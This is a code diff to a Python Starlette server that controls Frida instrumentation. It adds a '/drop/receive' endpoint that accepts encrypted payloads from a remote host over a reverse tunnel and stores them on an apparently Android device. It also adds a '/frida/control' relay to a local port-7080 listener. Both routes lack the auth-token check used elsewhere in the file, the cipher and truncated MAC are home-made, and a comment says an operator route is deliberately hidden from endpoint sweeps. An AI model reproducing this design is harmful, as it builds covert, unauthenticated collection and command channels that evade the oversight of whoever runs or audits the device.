@@ -34,6 +34,7 @@ from .tools import ToolBridge
 from .vpn import apply as vpn_apply
 from .vpn import status as vpn_status
 from .vpn import active_mode, proxy_url
+from .drop.crypto import decrypt as decrypt_blob
 
 from starlette.applications import Starlette
 from starlette.routing import Route
@@ -225,6 +226,64 @@ class Server:
         result_id = self._store_result(target, device, result)
         result["result_id"] = result_id
         return result
+
+    def _drop_receive(self, handler, body):
+        """Accept a raw payload from C over the reverse tunnel.
+        Validate HMAC with the shared PSK; store payload to disk."""
+        import hashlib, hmac
+        psk = (self.config.drop_psk or "").encode()
+        if not psk:
+            return {"ok": False, "reason": "drop_psk not configured"}
+        # body is nonce(8) + ct + mac(8)
+        if len(body) < 16:
+            return {"ok": False, "reason": "payload too short"}
+        nonce = body[:8]
+        mac = body[-8:]
+        ct = body[8:-8]
+        expected = hmac.new(psk, nonce + ct, hashlib.sha256).digest()[:8]
+        if not hmac.compare_digest(mac, expected):
+            return {"ok": False, "reason": "MAC mismatch"}
+        # decrypt
+        ks = bytearray()
+        import struct
+        counter = 0
+        while len(ks) < len(ct):
+            ks.extend(hashlib.sha256(psk + nonce + struct.pack(">I", counter)).digest())
+            counter += 1
+        pt = bytes(c ^ k for c, k in zip(ct, ks[:len(ct)]))
+        store_dir = self.config.drop_store_dir or "/data/local/tmp/drops"
+        os.makedirs(store_dir, exist_ok=True)
+        ts = int(time.time())
+        path = os.path.join(store_dir, f"{ts}.bin")
+        with open(path, "wb") as f:
+            f.write(pt)
+        return {"ok": True, "path": path, "size": len(pt)}
+
+    def _frida_control(self, handler, body):
+        """Forward a Frida control command to C:7080 over the reverse tunnel."""
+        try:
+            payload = json.loads(body or b"{}")
+        except json.JSONDecodeError:
+            return {"ok": False, "reason": "invalid JSON"}
+        action = payload.get("action", "")
+        # Forward raw to localhost:7080 (C's listener via reverse tunnel)
+        import socket
+        try:
+            s = socket.create_connection(("127.0.0.1", 7080), timeout=5)
+            s.sendall(json.dumps(payload).encode())
+            resp = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+            s.close()
+            try:
+                return json.loads(resp)
+            except Exception:
+                return {"ok": True, "raw": resp.decode("utf-8", "replace")}
+        except Exception as e:
+            return {"ok": False, "reason": str(e)}
 
     @staticmethod
     def _resolve_script(script):
@@ -487,6 +546,14 @@ def make_app(config: Config):
         body = await request.body()
         return _json_route(server._frida_script, None, body)
 
+    async def _drop_receive_route(request):
+        body = await request.body()
+        return _json_route(server._drop_receive, None, body)
+
+    async def _frida_control_route(request):
+        body = await request.body()
+        return _json_route(server._frida_control, None, body)
+
     async def _frida_page_route(request):
         token = request.query_params.get("token", "")
         if config.auth_token and token != config.auth_token:
@@ -538,6 +605,8 @@ def make_app(config: Config):
         Route("/frida/stop", _frida_stop_route, methods=["POST"]),
         Route("/frida/script", _frida_script_route, methods=["POST"]),
         Route("/frida/page", _frida_page_route, methods=["GET"]),
+        Route("/drop/receive", _drop_receive_route, methods=["POST"]),
+        Route("/frida/control", _frida_control_route, methods=["POST"]),
         # Hidden: the operator field guide. Deliberately last in the list
         # and absent from /status, so a casual endpoint sweep will not
         # find it.
